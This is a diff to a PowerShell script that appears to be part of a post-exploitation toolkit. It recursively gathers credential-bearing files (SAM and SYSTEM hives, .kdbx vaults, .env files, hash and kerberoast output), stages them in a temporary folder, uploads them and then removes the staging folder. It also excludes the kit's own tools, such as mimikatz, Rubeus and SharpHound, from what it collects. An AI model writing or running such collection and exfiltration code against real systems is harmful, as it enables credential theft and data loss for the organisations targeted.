@@ -78,30 +78,59 @@ function Write-CompletionMessage {
 
 Write-SectionHeader "Custom Upload - File Discovery and Upload"
 
-# File extensions to include (only valid patterns)
+# Create a dedicated staging directory for discovered files
+$stagingDir = Join-Path -Path $thisDir -ChildPath "SLAMIT_Custom_Upload_Files"
+if (Test-Path $stagingDir) {
+    Remove-Item -Path $stagingDir -Recurse -Force
+}
+New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null
+
+Write-Host "Created staging directory: $stagingDir" -ForegroundColor Yellow
+
+# File extensions to include (exclude .exe to avoid tool contamination)
 $extensions = @(
     '*.txt','*.log','*.pdf','*.zip','*.doc','*.docx','*.xls','*.xlsx',
     '*.ppt','*.pptx','*.csv','*.ini','*.conf','*.cfg','*.env',
-    '*.yaml','*.yml','*.json','*.xml','*.ps1','*.bat','*.cmd','*.sh',
-    '*.kdbx','*.rdp','*.7z','*.rar','*.tar','*.gz','*.bak','*.old',
-    '*.tmp','*.db','*.sqlite','*.sqlite3','*.mdb','*.accdb','*.rtf','*.md',
-    '*.hash','*.kerberoast',"*.exe"
+    '*.yaml','*.yml','*.json','*.xml','*.kdbx','*.rdp','*.7z','*.rar',
+    '*.tar','*.gz','*.bak','*.old','*.tmp','*.db','*.sqlite','*.sqlite3',
+    '*.mdb','*.accdb','*.rtf','*.md','*.hash','*.kerberoast'
 )
 
 # Special filenames to search explicitly
 $specialFiles = @('SAM','SYSTEM')
 
+# Comprehensive list of tools and scripts to exclude
+$excludePatterns = @(
+    "mimikatz*", "SharpHound*", "winPEAS*", "PowerView*", "PowerUp*", 
+    "BloodHound*", "custom_upload*", "slamit*", "PsExec*", "Rubeus*", 
+    "chisel*", "agent*", "*.ps1", "*.exe", "*.bat", "*.cmd"
+)
+
 $thisDir = (Split-Path -Path $MyInvocation.MyCommand.Path -Parent)  # Script's directory
 Write-Host "Searching $thisDir for files..."
 
 $allFiles = @()
+$stagedFiles = @()
 
-# Search by extensions
+# Search by extensions (with filtering)
 foreach ($ext in $extensions) {
-    $found = Get-ChildItem -Path $thisDir -Recurse -Include $ext -File -ErrorAction SilentlyContinue `
-        -Exclude "mimikatz*", "SharpHound*", "winPEAS", "PowerView*", "PowerUp*", "BloodHound*", "*custom_upload*"
+    $found = Get-ChildItem -Path $thisDir -Recurse -Include $ext -File -ErrorAction SilentlyContinue
     if ($found) {
-        $allFiles += $found.FullName
+        # Filter out tool files and scripts
+        $filteredFiles = $found | Where-Object { 
+            $fileName = $_.Name.ToLower()
+            $shouldExclude = $false
+            foreach ($pattern in $excludePatterns) {
+                if ($fileName -like $pattern.ToLower()) {
+                    $shouldExclude = $true
+                    break
+                }
+            }
+            -not $shouldExclude
+        }
+        if ($filteredFiles) {
+            $allFiles += $filteredFiles
+        }
     }
 }
 
@@ -109,20 +138,57 @@ foreach ($ext in $extensions) {
 foreach ($special in $specialFiles) {
     $found = Get-ChildItem -Path $thisDir -Recurse -Filter $special -ErrorAction SilentlyContinue
     if ($found) {
-        $allFiles += $found.FullName
+        $allFiles += $found
     }
 }
+
+Write-Host "Found $($allFiles.Count) interesting files" -ForegroundColor Green
+
+# Stage files to the dedicated directory
+foreach ($file in $allFiles) {
+    try {
+        # Create a unique filename to avoid conflicts
+        $fileName = $file.Name
+        $baseName = [System.IO.Path]::GetFileNameWithoutExtension($fileName)
+        $extension = [System.IO.Path]::GetExtension($fileName)
+        
+        # For system files like SAM/SYSTEM, include path info
+        if ($fileName -match "^(SAM|SYSTEM)$") {
+            $sanitizedPath = ($file.DirectoryName -replace "[:\\]", "_")
+            $fileName = "$baseName`_$sanitizedPath$extension"
+        }
+        
+        $targetPath = Join-Path -Path $stagingDir -ChildPath $fileName
+        $counter = 1
+
+        # Handle conflicts by adding -1, -2, etc.
+        while (Test-Path $targetPath) {
+            $targetPath = Join-Path -Path $stagingDir -ChildPath "$baseName-$counter$extension"
+            $counter++
+        }
+
+        # Copy file to staging directory
+        Copy-Item -Path $file.FullName -Destination $targetPath -ErrorAction Stop
+        $stagedFiles += $targetPath
+        Write-Host "Staged: $($file.Name) → $targetPath" -ForegroundColor Green
+    }
+    catch {
+        Write-Warning "Failed to stage: $($file.FullName) — $_"
+    }
+}
+
+Write-Host "Successfully staged $($stagedFiles.Count) files to: $stagingDir" -ForegroundColor Green
 
 # Filter out the script itself
 # $files = $allFiles | Where-Object { $_.FullName -ne $thisScript }
 
-Write-Host "Starting upload of $($allFiles.Count) files..." -ForegroundColor Yellow
+Write-Host "Starting upload of $($stagedFiles.Count) staged files..." -ForegroundColor Yellow
 
 $uploadCount = 0
 $successCount = 0
 $failedCount = 0
 
-foreach ($file in $allFiles) {
+foreach ($file in $stagedFiles) {
     $uploadCount++
     try {
         $fileBytes = [System.IO.File]::ReadAllBytes($file)
@@ -177,3 +243,14 @@ Write-Host "╚═════════════════════�
 Write-Host ""
 
 Write-CompletionMessage "Custom Upload Complete"
+
+# Cleanup staging directory
+try {
+    if (Test-Path $stagingDir) {
+        Remove-Item -Path $stagingDir -Recurse -Force
+        Write-Host "Cleaned up staging directory: $stagingDir" -ForegroundColor Green
+    }
+}
+catch {
+    Write-Warning "Failed to cleanup staging directory: $_"
+}
